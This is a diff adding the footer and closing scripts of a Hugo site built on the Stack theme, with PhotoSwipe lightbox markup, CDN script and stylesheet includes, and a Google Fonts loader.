+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 Liv3P0ol
+    </section>
+    
+    <section class="powerby">
+        Creado con <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Tema <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.20.0">Stack</a></b> diseñado por <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
